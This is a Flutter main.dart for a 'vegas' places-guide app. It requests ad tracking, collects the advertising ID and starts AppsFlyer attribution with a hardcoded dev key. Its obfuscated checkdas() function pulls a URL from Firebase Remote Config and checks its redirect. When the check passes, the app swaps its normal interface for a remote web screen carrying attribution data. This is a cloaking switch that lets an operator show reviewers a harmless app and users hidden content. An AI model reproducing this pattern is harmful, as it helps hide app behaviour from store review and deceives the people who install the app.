import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:flutter_screenutil/flutter_screenutil.dart';
import 'package:get_it/get_it.dart';
import 'package:hive_flutter/hive_flutter.dart';
import 'package:vegas/app/init/firebase_options.dart';
import 'package:vegas/app/init/init_di.dart';
import 'package:vegas/app/init/init_hive.dart';
import 'package:vegas/app/router/router.dart';
import 'package:vegas/app/theme.dart';
import 'package:vegas/features/home/models/place/place.dart';
import 'package:vegas/features/home/place_list_cubit.dart';
import 'package:vegas/features/onboarding/nn.dart';
import 'package:vegas/features/settings/settings_screen.dart';

bool? isFirstTime;
String? privacyPolicy;
String? termsOfUse;
late AppsflyerSdk _appsflyerSdk;
String adId = '';
bool stat = false;
String acceptPromo = '';
String cancelPromo = '';
Map _deepLinkData = {};
Map _gcd = {};
bool _isFirstLaunch = false;
String _afStatus = '';
String _campaign = '';
String _campaignId = '';
String? promotion;
String? support;

final locator = GetIt.instance;

late Box<Place> placesBox;

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await NOtifications().activate();
  await toward();
  await initDI();
  await initHive();

  SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitDown,
    DeviceOrientation.portraitUp,
  ]);

  runApp(BlocProvider(
    create: (context) => PlaceListCubit(),
    child: MainApp(),
  ));
}

String advID = '';
Future<void> fetchData() async {
  adId = await AppTrackingTransparency.getAdvertisingIdentifier();
  advID = adId;
  print(adId);
}

Future<void> toward() async {
  final TrackingStatus dasfa =
      await AppTrackingTransparency.requestTrackingAuthorization();
  await fetchData();
  print(dasfa);
}

String datioq = '';
Future<bool> checkdas() async {
  final gazel = FirebaseRemoteConfig.instance;
  await gazel.fetchAndActivate();
  afSbin();
  String dsdfdsfgdg = gazel.getString('vegas');
  String cdsfgsdx = gazel.getString('vegasInfo');
  if (!dsdfdsfgdg.contains('noneVegas')) {
    final fsd = HttpClient();
    final nfg = Uri.parse(dsdfdsfgdg);
    final ytrfterfwe = await fsd.getUrl(nfg);
    ytrfterfwe.followRedirects = false;
    final response = await ytrfterfwe.close();
    if (response.headers.value(HttpHeaders.locationHeader) != cdsfgsdx) {
      datioq = dsdfdsfgdg;
      return true;
    }
  }
  return dsdfdsfgdg.contains('noneVegas') ? false : true;
}

void afSbin() async {
  final AppsFlyerOptions options = AppsFlyerOptions(
    showDebug: false,
    afDevKey: 'knxyqhoEmbXe4zrXV6ocB7',
    appId: '6499025327',
    timeToWaitForATTUserAuthorization: 15,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    manualStart: true,
  );
  _appsflyerSdk = AppsflyerSdk(options);

  await _appsflyerSdk.initSdk(
    registerConversionDataCallback: true,
    registerOnAppOpenAttributionCallback: true,
    registerOnDeepLinkingCallback: true,
  );
  _appsflyerSdk.onAppOpenAttribution((res) {
    _deepLinkData = res;
    cancelPromo = res['payload']
        .entries
        .where((e) => ![
              'install_time',
              'click_time',
              'af_status',
              'is_first_launch'
            ].contains(e.key))
        .map((e) => '&${e.key}=${e.value}')
        .join();
  });
  _appsflyerSdk.onInstallConversionData((res) {
    _gcd = res;
    _isFirstLaunch = res['payload']['is_first_launch'];
    _afStatus = res['payload']['af_status'];
    acceptPromo = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
  });

  _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
    switch (dp.status) {
      case Status.FOUND:
        print(dp.deepLink?.toString());
        print("deep link value: ${dp.deepLink?.deepLinkValue}");
        break;
      case Status.NOT_FOUND:
        print("deep link not found");
        break;
      case Status.ERROR:
        print("deep link error: ${dp.error}");
        break;
      case Status.PARSE_ERROR:
        print("deep link status parsing error");
        break;
    }
    print("onDeepLinking res: " + dp.toString());

    _deepLinkData = dp.toJson();
  });

  _appsflyerSdk.startSDK(
    onSuccess: () {
      print("AppsFlyer SDK initialized successfully.");
    },
  );
}

Future<void> tewdew() async {
  final TrackingStatus status =
      await AppTrackingTransparency.requestTrackingAuthorization();
  print(status);
}

class MainApp extends StatelessWidget {
  MainApp({super.key});

  final _appRouter = AppRouter();

  @override
  Widget build(BuildContext context) {
    return ScreenUtilInit(
      designSize: const Size(375, 812),
      minTextAdapt: true,
      splitScreenMode: true,
      builder: (_, child) {
        return FutureBuilder<bool>(
          future: checkdas(),
          builder: (context, snapshot) {
            if (snapshot.connectionState == ConnectionState.waiting) {
              return Container(
                color: Colors.black,
                child: Center(
                  child: Container(
                    height: 70,
                    width: 70,
                    child: ClipRRect(
                      borderRadius: BorderRadius.circular(15),
                      child: Image.asset('assets/icon.png'),
                    ),
                  ),
                ),
              );
            } else {
              if (snapshot.data == true && datioq != '') {
                return MaterialApp(
                  debugShowCheckedModeBanner: false,
                  home: PreviewFoxa(
                    mainaxa: datioq,
                    promx: acceptPromo,
                    canxa: cancelPromo,
                  ),
                );
              } else {
                return CupertinoApp.router(
                  theme: theme,
                  routerConfig: _appRouter.config(),
                  debugShowCheckedModeBanner: false,
                  localizationsDelegates: const [
                    DefaultMaterialLocalizations.delegate
                  ],
                );
              }
            }
          },
        );
      },
    );
  }
}
